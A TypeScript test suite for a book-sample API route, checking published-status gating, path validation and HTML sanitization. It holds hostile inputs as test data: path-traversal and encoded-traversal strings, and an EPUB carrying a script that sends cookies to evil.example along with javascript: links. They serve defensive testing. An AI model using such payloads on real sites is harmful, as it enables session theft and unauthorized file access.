import { describe, expect, it, vi, beforeEach, afterEach } from "vitest";
import {
  BOOK_FIXTURE_AUTHOR_ID,
  BOOK_FIXTURE_BOOK_ID,
  UNSAFE_MANUSCRIPT_PATHS,
} from "@/lib/book-storage-path-test-fixtures";

// LIBRUM 2.0 PRODUCT-1: same mocking discipline as the download route's
// own test file (src/app/api/books/[id]/download/route.test.ts) --
// mocks only the Supabase network boundary, uses a real Buffer/Blob for
// the "manuscript" and the real extractEpubSample() (imported for real,
// not mocked) so these tests also prove the route and the extractor
// actually compose correctly end to end.
//
// MANUSCRIPT-DELIVERY-STORAGE-AUTH-1: fixtures are real lowercase UUIDs
// and the canonical `<author id>/<book id>.epub` key. extractEpubSample
// is still the real implementation, wrapped in a spy only so tests can
// prove an invalid path never reaches it. The fake clients record the
// selected columns, the id filter, the bucket and the key.

const mockCreateClient = vi.fn();
vi.mock("@/lib/supabase/server", () => ({ createClient: () => mockCreateClient() }));
const mockCreateAdminClient = vi.fn();
vi.mock("@/lib/supabase/admin", () => ({ createAdminClient: () => mockCreateAdminClient() }));
vi.mock("@/lib/epub-sample", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/epub-sample")>();
  return { ...actual, extractEpubSample: vi.fn(actual.extractEpubSample) };
});

const { GET } = await import("./route");
const { extractEpubSample } = await import("@/lib/epub-sample");
const mockExtractEpubSample = vi.mocked(extractEpubSample);
const JSZip = (await import("jszip")).default;

const AUTHOR_ID = "3f2a8c1e-5b7d-4e9a-8c6f-1a2b3c4d5e6f";
const BOOK_ID = "9d8c7b6a-5f4e-4d3c-9b2a-1f0e9d8c7b6a";
const OTHER_AUTHOR_ID = "7e6d5c4b-3a29-4817-8a6b-5c4d3e2f1a0b";
const OTHER_BOOK_ID = "2b3c4d5e-6f70-4812-9a3b-4c5d6e7f8091";
const CANONICAL_PATH = `${AUTHOR_ID}/${BOOK_ID}.epub`;
const EXPECTED_COLUMNS =
  "id, author_id, title, status, file_path, profiles:public_author_profiles(public_author_name)";

// Every value here is refused for a row whose id is BOOK_ID and whose
// author_id is AUTHOR_ID.
const INVALID_STRING_PATHS: Array<[string, string]> = [
  ["another author's canonical manuscript", `${OTHER_AUTHOR_ID}/${OTHER_BOOK_ID}.epub`],
  ["another author's folder, this book id", `${OTHER_AUTHOR_ID}/${BOOK_ID}.epub`],
  ["the same author's other book", `${AUTHOR_ID}/${OTHER_BOOK_ID}.epub`],
  ["traversal into another author", `${AUTHOR_ID}/../${OTHER_AUTHOR_ID}/${OTHER_BOOK_ID}.epub`],
  ["traversal that resolves to itself", `${AUTHOR_ID}/../${AUTHOR_ID}/${BOOK_ID}.epub`],
  ["dot segment", `${AUTHOR_ID}/./${BOOK_ID}.epub`],
  ["traversal out of the bucket", `../covers/${AUTHOR_ID}/${BOOK_ID}-cover.png`],
  ["encoded traversal", `${AUTHOR_ID}/%2e%2e/${OTHER_AUTHOR_ID}/${OTHER_BOOK_ID}.epub`],
  ["upper-case encoded traversal", `${AUTHOR_ID}/%2E%2E/${AUTHOR_ID}/${BOOK_ID}.epub`],
  ["encoded slash", `${AUTHOR_ID}%2F${BOOK_ID}.epub`],
  ["percent-encoded canonical", encodeURIComponent(CANONICAL_PATH)],
  ["bucket-qualified", `manuscripts/${CANONICAL_PATH}`],
  ["storage-API object path", `/storage/v1/object/manuscripts/${CANONICAL_PATH}`],
  ["storage-API relative object path", `object/manuscripts/${CANONICAL_PATH}`],
  ["absolute storage URL", `https://abcdefghijklmnopqrst.supabase.co/storage/v1/object/manuscripts/${CANONICAL_PATH}`],
  ["leading slash", `/${CANONICAL_PATH}`],
  ["double slash", `${AUTHOR_ID}//${BOOK_ID}.epub`],
  ["trailing slash", `${CANONICAL_PATH}/`],
  ["upper-case author UUID", `${AUTHOR_ID.toUpperCase()}/${BOOK_ID}.epub`],
  ["upper-case book UUID", `${AUTHOR_ID}/${BOOK_ID.toUpperCase()}.epub`],
  ["upper-case extension", `${AUTHOR_ID}/${BOOK_ID}.EPUB`],
  ["mixed-case extension", `${AUTHOR_ID}/${BOOK_ID}.Epub`],
  ["wrong extension", `${AUTHOR_ID}/${BOOK_ID}.pdf`],
  ["double extension", `${AUTHOR_ID}/${BOOK_ID}.epub.epub`],
  ["hidden second extension", `${AUTHOR_ID}/${BOOK_ID}.pdf.epub`],
  ["no extension", `${AUTHOR_ID}/${BOOK_ID}`],
  ["cover key", `${AUTHOR_ID}/${BOOK_ID}-cover.png`],
  ["author-id prefix confusion", `${AUTHOR_ID}x/${BOOK_ID}.epub`],
  ["book-id prefix confusion", `${AUTHOR_ID}/${BOOK_ID}0.epub`],
  ["book-id only", `${BOOK_ID}.epub`],
  ["query string", `${CANONICAL_PATH}?download=1`],
  ["fragment", `${CANONICAL_PATH}#x`],
  ["leading whitespace", ` ${CANONICAL_PATH}`],
  ["trailing whitespace", `${CANONICAL_PATH} `],
  ["trailing newline", `${CANONICAL_PATH}\n`],
  ["embedded null byte", `${CANONICAL_PATH}\u0000`],
];

const INVALID_NON_STRING_PATHS: Array<[string, unknown]> = [
  ["number", 42],
  ["object", { path: CANONICAL_PATH }],
  ["array", [CANONICAL_PATH]],
  ["boolean", true],
];

type QueryResult = { data: unknown; error: unknown };

type FakeBook = {
  id?: unknown;
  author_id?: unknown;
  title?: unknown;
  status?: unknown;
  file_path?: unknown;
  profiles?: { display_name?: string; public_author_name?: string | null } | null;
};

function publishedBook(overrides: FakeBook = {}): FakeBook {
  return {
    id: BOOK_ID,
    author_id: AUTHOR_ID,
    title: "Test Book",
    status: "published",
    file_path: CANONICAL_PATH,
    profiles: { display_name: "Renata Author" },
    ...overrides,
  };
}

function makeFakeSupabase(overrides: { book?: FakeBook | null; result?: QueryResult } = {}) {
  const book = "book" in overrides ? overrides.book : publishedBook();
  const result = overrides.result ?? { data: book, error: null };

  const maybeSingle = vi.fn(() => Promise.resolve(result));
  const eq = vi.fn(() => ({ maybeSingle }));
  const select = vi.fn(() => ({ eq }));
  const from = vi.fn(() => ({ select }));
  return { from, __from: from, __select: select, __eq: eq, __maybeSingle: maybeSingle };
}

function makeFakeAdminClient(overrides: { fileBytes?: Buffer; downloadError?: unknown } = {}) {
  const { fileBytes, downloadError = null } = overrides;
  const download = vi.fn((_path: string) =>
    Promise.resolve(
      downloadError || !fileBytes
        ? { data: null, error: downloadError ?? new Error("no file") }
        : { data: new Blob([new Uint8Array(fileBytes)]), error: null },
    ),
  );
  const from = vi.fn((_bucket: string) => ({ download }));
  return { storage: { from }, __from: from, __download: download };
}

async function buildValidEpubBytes(): Promise<Buffer> {
  const zip = new JSZip();
  zip.file("mimetype", "application/epub+zip", { compression: "STORE" });
  zip.file(
    "META-INF/container.xml",
    `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`,
  );
  zip.file(
    "OEBPS/content.opf",
    `<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>T</dc:title></metadata><manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/></spine></package>`,
  );
  zip.file(
    "OEBPS/c1.xhtml",
    `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body><p>${"real sample content word ".repeat(60)}</p></body></html>`,
  );
  return Buffer.from(await zip.generateAsync({ type: "nodebuffer" }));
}

function makeRequest() {
  return new Request(`https://librumal.vercel.app/api/books/${BOOK_ID}/sample`);
}

function callRoute() {
  return GET(makeRequest(), { params: Promise.resolve({ id: BOOK_ID }) });
}

describe("GET /api/books/[id]/sample", () => {
  const logSpies: Array<ReturnType<typeof vi.spyOn>> = [];

  beforeEach(() => {
    mockCreateClient.mockReset();
    mockCreateAdminClient.mockReset();
    mockExtractEpubSample.mockClear();
    logSpies.length = 0;
    for (const method of ["log", "info", "warn", "error", "debug"] as const) {
      logSpies.push(vi.spyOn(console, method).mockImplementation(() => {}));
    }
  });

  afterEach(() => {
    for (const spy of logSpies) spy.mockRestore();
  });

  describe("visibility", () => {
    it("published book with a valid manuscript -> 200 with sanitized sections, no auth required", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await callRoute();

      expect(response.status).toBe(200);
      const body = await response.json();
      expect(body.bookId).toBe(BOOK_ID);
      expect(body.title).toBe("Test Book");
      expect(body.author).toBe("Renata Author");
      expect(body.sections.length).toBeGreaterThan(0);
      expect(body.sections[0].html).toContain("real sample content");
      expect(typeof body.approximatePercent).toBe("number");
    });

    // LIBRUM 2.0 AUTHOR-1B: this route's "author" field is the one and
    // only place a pseudonymous author's identity is exposed here -- it
    // must be the reader-facing public_author_name, never the private
    // account display_name, whenever the two differ.
    it("author has set a public author name (pen name) -> JSON 'author' is the pen name, never the account display_name", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: publishedBook({
            profiles: { display_name: "Renata Author", public_author_name: "R. A. Nightingale" },
          }),
        }),
      );
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await callRoute();
      const body = await response.json();

      expect(body.author).toBe("R. A. Nightingale");
      const serialized = JSON.stringify(body);
      expect(serialized).not.toContain("Renata Author");
    });

    it("no public author name set -> falls back to the account display_name", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: publishedBook({
            profiles: { display_name: "Renata Author", public_author_name: null },
          }),
        }),
      );
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await callRoute();
      const body = await response.json();

      expect(body.author).toBe("Renata Author");
    });

    // The draft carries a canonical path, so only the published-status
    // gate (not the path check) can be what refuses it.
    it("draft/unpublished book with a canonical manuscript -> 404, never reaches storage", async () => {
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({ book: publishedBook({ title: "Draft", status: "draft", profiles: null }) }),
      );
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await callRoute();

      expect(response.status).toBe(404);
      expect(await response.json()).toEqual({ error: "not_found" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
      expect(adminClient.__download).not.toHaveBeenCalled();
      expect(mockExtractEpubSample).not.toHaveBeenCalled();
    });

    it.each(["archived", "pending", "", "PUBLISHED", "published "])(
      "status %j with a canonical manuscript -> 404 not_found, never reaches storage",
      async (status) => {
        mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: publishedBook({ status }) }));

        const response = await callRoute();

        expect(response.status).toBe(404);
        expect(await response.json()).toEqual({ error: "not_found" });
        expect(mockCreateAdminClient).not.toHaveBeenCalled();
      },
    );

    it("missing book -> 404, identical shape to a draft (no distinguishing information)", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: null }));
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient());

      const response = await callRoute();

      expect(response.status).toBe(404);
      const body = await response.json();
      expect(body).toEqual({ error: "not_found" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
    });

    it("draft and missing responses are byte-identical, headers included", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: null }));
      const missing = await callRoute();
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: publishedBook({ status: "draft" }) }));
      const draft = await callRoute();

      expect(draft.status).toBe(missing.status);
      expect(await draft.text()).toBe(await missing.text());
      expect([...draft.headers.entries()]).toEqual([...missing.headers.entries()]);
    });

    it("published book with no manuscript on file -> 404, never calls storage", async () => {
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({ book: publishedBook({ file_path: null, profiles: null }) }),
      );
      const adminClient = makeFakeAdminClient();
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await callRoute();

      expect(response.status).toBe(404);
      expect(await response.json()).toEqual({ error: "not_found" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
      expect(adminClient.__download).not.toHaveBeenCalled();
    });
  });

  describe("row identity binding", () => {
    it("selects exactly id, author_id, title, status, file_path and the public author view for the route's own id", async () => {
      const supabase = makeFakeSupabase();
      mockCreateClient.mockResolvedValue(supabase);
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() }));

      await callRoute();

      expect(supabase.__from).toHaveBeenCalledTimes(1);
      expect(supabase.__from).toHaveBeenCalledWith("books");
      expect(supabase.__select).toHaveBeenCalledTimes(1);
      expect(supabase.__select).toHaveBeenCalledWith(EXPECTED_COLUMNS);
      expect(supabase.__eq).toHaveBeenCalledTimes(1);
      expect(supabase.__eq).toHaveBeenCalledWith("id", BOOK_ID);
      expect(supabase.__maybeSingle).toHaveBeenCalledTimes(1);
    });

    it("a published canonical book fetches exactly <author>/<book>.epub from the manuscripts bucket", async () => {
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await callRoute();

      expect(response.status).toBe(200);
      expect(mockCreateAdminClient).toHaveBeenCalledTimes(1);
      expect(adminClient.__from).toHaveBeenCalledTimes(1);
      expect(adminClient.__from).toHaveBeenCalledWith("manuscripts");
      expect(adminClient.__download).toHaveBeenCalledTimes(1);
      expect(adminClient.__download).toHaveBeenCalledWith(CANONICAL_PATH);
      expect(mockExtractEpubSample).toHaveBeenCalledTimes(1);
    });
  });

  describe("invalid stored manuscript path on a published book", () => {
    async function expectSampleUnavailable(filePath: unknown) {
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ book: publishedBook({ file_path: filePath }) }));
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await callRoute();
      const text = await response.text();

      expect(response.status).toBe(404);
      expect(JSON.parse(text)).toEqual({ error: "sample_unavailable" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
      expect(adminClient.__from).not.toHaveBeenCalled();
      expect(adminClient.__download).not.toHaveBeenCalled();
      expect(mockExtractEpubSample).not.toHaveBeenCalled();
      for (const spy of logSpies) expect(spy).not.toHaveBeenCalled();
      return text;
    }

    it.each(INVALID_STRING_PATHS)("refuses %s with a controlled 404 that never echoes it", async (_label, filePath) => {
      const text = await expectSampleUnavailable(filePath);
      expect(text).not.toContain(filePath);
      expect(text).not.toContain(AUTHOR_ID);
      expect(text).not.toContain("/storage/v1/");
    });

    it.each(INVALID_NON_STRING_PATHS)("refuses a %s file_path", async (_label, filePath) => {
      await expectSampleUnavailable(filePath);
    });

    // The same hostile values the canonical rule and deleteAccount are
    // tested against. `undefined` and "" behave like "no manuscript on
    // file" (the pre-existing not_found); everything else is the
    // controlled sample_unavailable. Neither reaches the admin client.
    it.each(UNSAFE_MANUSCRIPT_PATHS)("refuses the shared unsafe manuscript value: %s", async (_label, filePath) => {
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: publishedBook({ id: BOOK_FIXTURE_BOOK_ID, author_id: BOOK_FIXTURE_AUTHOR_ID, file_path: filePath }),
        }),
      );
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_FIXTURE_BOOK_ID }) });
      const body = await response.json();

      expect(response.status).toBe(404);
      expect(body).toEqual({ error: filePath === "" || filePath === undefined ? "not_found" : "sample_unavailable" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
      expect(adminClient.__download).not.toHaveBeenCalled();
      expect(mockExtractEpubSample).not.toHaveBeenCalled();
      for (const spy of logSpies) expect(spy).not.toHaveBeenCalled();
    });

    it("the shared fixture's own canonical key is accepted for its own row", async () => {
      const canonical = `${BOOK_FIXTURE_AUTHOR_ID}/${BOOK_FIXTURE_BOOK_ID}.epub`;
      mockCreateClient.mockResolvedValue(
        makeFakeSupabase({
          book: publishedBook({ id: BOOK_FIXTURE_BOOK_ID, author_id: BOOK_FIXTURE_AUTHOR_ID, file_path: canonical }),
        }),
      );
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await GET(makeRequest(), { params: Promise.resolve({ id: BOOK_FIXTURE_BOOK_ID }) });

      expect(response.status).toBe(200);
      expect(adminClient.__download).toHaveBeenCalledWith(canonical);
    });
  });

  describe("database errors and malformed rows fail closed as not_found", () => {
    it.each<[string, QueryResult]>([
      ["an error with no data", { data: null, error: { message: "db down", code: "XX000" } }],
      ["an error with a plausible published canonical row", {
        data: publishedBook(),
        error: { message: "db down", code: "XX000" },
      }],
      ["an array of rows", { data: [publishedBook()], error: null }],
      ["a string", { data: CANONICAL_PATH, error: null }],
      ["a row without id", { data: publishedBook({ id: undefined }), error: null }],
      ["a row for another book id", {
        data: publishedBook({ id: OTHER_BOOK_ID, file_path: `${AUTHOR_ID}/${OTHER_BOOK_ID}.epub` }),
        error: null,
      }],
      ["a row for another book id carrying the route id's path", {
        data: publishedBook({ id: OTHER_BOOK_ID }),
        error: null,
      }],
      ["a row whose id differs only in case", { data: publishedBook({ id: BOOK_ID.toUpperCase() }), error: null }],
      ["a row without author_id", { data: publishedBook({ author_id: undefined }), error: null }],
      ["a row with a non-string author_id", { data: publishedBook({ author_id: 1 }), error: null }],
      ["a row with a non-string title", { data: publishedBook({ title: null }), error: null }],
      ["a row with a non-string status", { data: publishedBook({ status: true }), error: null }],
    ])("%s -> 404 not_found, no admin client", async (_label, result) => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase({ result }));
      const adminClient = makeFakeAdminClient({ fileBytes: await buildValidEpubBytes() });
      mockCreateAdminClient.mockReturnValue(adminClient);

      const response = await callRoute();
      const text = await response.text();

      expect(response.status).toBe(404);
      expect(JSON.parse(text)).toEqual({ error: "not_found" });
      expect(mockCreateAdminClient).not.toHaveBeenCalled();
      expect(adminClient.__download).not.toHaveBeenCalled();
      expect(mockExtractEpubSample).not.toHaveBeenCalled();
      expect(text).not.toContain("db down");
      expect(text).not.toContain(CANONICAL_PATH);
      for (const spy of logSpies) expect(spy).not.toHaveBeenCalled();
    });
  });

  describe("controlled failure", () => {
    it("storage download error -> 404, no leaked Supabase error detail", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(
        makeFakeAdminClient({ downloadError: { message: "internal supabase detail", code: "X" } }),
      );

      const response = await callRoute();

      expect(response.status).toBe(404);
      const body = await response.json();
      const serialized = JSON.stringify(body);
      expect(serialized).not.toContain("internal supabase detail");
    });

    it("unreadable/malformed manuscript -> 404, safe controlled failure, not a 500", async () => {
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(
        makeFakeAdminClient({ fileBytes: Buffer.from("not actually a zip") }),
      );

      const response = await callRoute();

      expect(response.status).toBe(404);
    });
  });

  describe("security -- response payload", () => {
    it("never includes the manuscript storage path or any signed/storage URL", async () => {
      const fileBytes = await buildValidEpubBytes();
      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await callRoute();
      const serialized = JSON.stringify(await response.json());

      expect(serialized).not.toContain(CANONICAL_PATH);
      expect(serialized).not.toContain(AUTHOR_ID);
      expect(serialized).not.toContain("manuscript_path");
      expect(serialized).not.toContain("supabase.co");
      expect(serialized).not.toContain("/storage/v1/");
      expect(serialized).not.toContain("service_role");
    });

    // LIBRUM 2.0 PRODUCT-1 PRE-COMMIT HARDENING: pins the actual render
    // boundary end to end -- sections[].html here is EXACTLY the value
    // src/components/book-sample-reader.tsx passes to
    // dangerouslySetInnerHTML, unmodified in between. A hostile
    // manuscript (script tag, event-handler attribute, javascript: link)
    // goes in; the live JSON response coming back out must contain only
    // the fixed allowed-tag vocabulary, with zero attributes on any tag.
    it("a hostile manuscript's script/event-handler/javascript: content never survives into the JSON sections payload", async () => {
      const zip = new JSZip();
      zip.file("mimetype", "application/epub+zip", { compression: "STORE" });
      zip.file(
        "META-INF/container.xml",
        `<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>`,
      );
      zip.file(
        "OEBPS/content.opf",
        `<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title>T</dc:title></metadata><manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="c1"/></spine></package>`,
      );
      zip.file(
        "OEBPS/c1.xhtml",
        `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml"><body>` +
          `<p onclick="steal()">Real content ${"word ".repeat(60)}</p>` +
          `<script>document.location='https://evil.example/'+document.cookie</script>` +
          `<a href="javascript:alert(1)">click</a>` +
          `<img src="https://evil.example/track.png"/>` +
          `</body></html>`,
      );
      const fileBytes = Buffer.from(await zip.generateAsync({ type: "nodebuffer" }));

      mockCreateClient.mockResolvedValue(makeFakeSupabase());
      mockCreateAdminClient.mockReturnValue(makeFakeAdminClient({ fileBytes }));

      const response = await callRoute();
      const body = await response.json();

      expect(response.status).toBe(200);
      const allHtml: string = body.sections.map((s: { html: string }) => s.html).join("");

      expect(allHtml).not.toContain("steal");
      expect(allHtml).not.toContain("document.cookie");
      expect(allHtml).not.toContain("evil.example");
      expect(allHtml).not.toContain("javascript:");
      expect(allHtml).not.toMatch(/<script/i);
      expect(allHtml).not.toMatch(/<img/i);
      expect(allHtml).not.toMatch(/<a[\s>]/i);
      // Every tag present is from the fixed allowed vocabulary, and
      // none of them carry any attribute at all.
      const tagNames = [...allHtml.matchAll(/<\/?([a-zA-Z0-9]+)[^>]*>/g)].map((m) => m[1].toLowerCase());
      const ALLOWED = new Set([
        "p", "h1", "h2", "h3", "h4", "h5", "h6", "blockquote",
        "em", "strong", "i", "b", "br", "hr", "ul", "ol", "li", "small", "sup", "sub",
      ]);
      for (const tag of tagNames) {
        expect(ALLOWED.has(tag)).toBe(true);
      }
      expect(allHtml).not.toMatch(/<[a-zA-Z][^>]*=/);
      expect(allHtml).toContain("Real content");
    });
  });
});
